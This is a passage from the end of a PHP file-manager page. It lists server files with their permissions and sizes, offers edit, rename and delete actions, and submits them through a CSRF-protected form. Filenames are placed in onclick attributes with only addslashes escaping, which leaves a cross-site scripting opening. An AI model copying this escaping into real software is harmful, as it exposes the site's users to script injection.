                                    <td><span class="file-perms"><?php echo substr(sprintf('%o', fileperms($fm->getCurrentDir().'/'.$f)), -4); ?></span></td>
                                    <td><span class="file-size">&#8212;</span></td>
                                    <td class="text-end">
                                        <div class="actions">
                                            <button onclick="ren('<?php echo addslashes($f); ?>')" class="btn btn-secondary btn-sm" title="Rename"><i class="bi bi-pencil"></i></button>
                                            <button onclick="del('<?php echo addslashes($f); ?>')" class="btn btn-danger btn-sm" title="Delete"><i class="bi bi-trash"></i></button>
                                        </div>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                            <?php foreach($list['files'] as $f):
                                $size = filesize($fm->getCurrentDir().'/'.$f);
                                $sizeStr = '';
                                if ($size >= 1048576) $sizeStr = round($size/1048576, 1).' MB';
                                elseif ($size >= 1024) $sizeStr = round($size/1024, 1).' KB';
                                else $sizeStr = $size.' B';
                                $icon = $fm->getFileIcon($f);
                            ?>
                                <tr>
                                    <td>
                                        <span class="file-name">
                                            <i class="<?php echo $icon; ?> file-icon"></i> <?php echo htmlspecialchars($f); ?>
                                        </span>
                                    </td>
                                    <td><span class="file-perms"><?php echo substr(sprintf('%o', fileperms($fm->getCurrentDir().'/'.$f)), -4); ?></span></td>
                                    <td><span class="file-size"><?php echo $sizeStr; ?></span></td>
                                    <td class="text-end">
                                        <div class="actions">
                                            <a href="?edit=<?php echo urlencode($f); ?>&dir=<?php echo urlencode(isset($_GET['dir']) ? $_GET['dir'] : ''); ?>" class="btn btn-primary btn-sm" title="Edit"><i class="bi bi-pencil-square"></i></a>
                                            <button onclick="ren('<?php echo addslashes($f); ?>')" class="btn btn-secondary btn-sm" title="Rename"><i class="bi bi-pencil"></i></button>
                                            <button onclick="del('<?php echo addslashes($f); ?>')" class="btn btn-danger btn-sm" title="Delete"><i class="bi bi-trash"></i></button>
                                        </div>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                            <?php if(empty($list['folders']) && empty($list['files'])): ?>
                                <tr><td colspan="4" class="text-center text-muted-custom py-4">This directory is empty</td></tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            <?php endif; ?>
        </div>
    </div>
</div>

<!-- Hidden form for actions -->
<form id="actionForm" method="post" style="display:none">
    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
    <input type="hidden" name="action" id="f_action">
    <input type="hidden" name="item_name" id="f_item">
    <input type="hidden" name="old_name" id="f_old">
    <input type="hidden" name="new_name" id="f_new">
</form>

<script>
// Toggle sidebar on mobile
document.getElementById('sidebarToggle').addEventListener('click', function(e) {
    e.stopPropagation();
    document.getElementById('sidebar').classList.toggle('show');
});
// Close sidebar when a folder link is clicked (mobile)
document.querySelectorAll('.fm-sidebar .folder-list a, .fm-sidebar .nav-btn').forEach(function(el) {
    el.addEventListener('click', function() {
        if (window.innerWidth <= 768) {
            document.getElementById('sidebar').classList.remove('show');
        }
    });
});
// Close sidebar if clicking outside (optional)
document.addEventListener('click', function(e) {
    const sidebar = document.getElementById('sidebar');
    const toggle = document.getElementById('sidebarToggle');
    if (window.innerWidth <= 768 && sidebar.classList.contains('show')) {
        if (!sidebar.contains(e.target) && !toggle.contains(e.target)) {
            sidebar.classList.remove('show');
        }
    }
});

function del(name) {
    if(confirm('Delete "' + name + '" permanently?')) {
        document.getElementById('f_action').value = 'delete';
        document.getElementById('f_item').value = name;
        document.getElementById('actionForm').submit();
    }
}
function ren(name) {
    let newName = prompt('New name:', name);
    if(newName && newName !== name) {
        document.getElementById('f_action').value = 'rename';
        document.getElementById('f_old').value = name;
        document.getElementById('f_new').value = newName;
        document.getElementById('actionForm').submit();
    }
}
</script>
</body>
</html>
